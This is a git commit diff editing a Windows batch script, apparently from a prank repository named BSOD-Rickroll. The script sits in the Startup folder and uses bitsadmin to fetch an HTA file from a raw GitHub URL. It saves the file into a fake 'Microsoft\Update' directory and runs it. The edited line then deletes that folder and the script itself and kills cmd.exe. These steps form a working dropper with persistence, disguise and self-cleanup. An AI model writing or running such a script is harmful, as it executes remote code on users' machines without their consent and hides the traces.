a9f54a01148ad9b4e5e1cc7658a9796af2b880f3
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-30 11:19:18 +0800

    Update Instant_startup.bat

--- Instant/Instant_startup.bat
+++ Instant/Instant_startup.bat
@@ -6,4 +6,4 @@ mkdir "%AppData%\Microsoft\Update\User\Services"
 
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Instant/Instant_msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
 start "%AppData%\Microsoft\Update\msrkl.hta"
-start rmdir /s /q "%appdata%\Microsoft\Update" && del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Instant_startup.bat" && taskkill /f /im cmd.exe
+start rmdir /s /q "%appdata%\Microsoft\Update" || exit /b 0 && del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Instant_startup.bat"  || exit /b 0 && taskkill /f /im cmd.exe
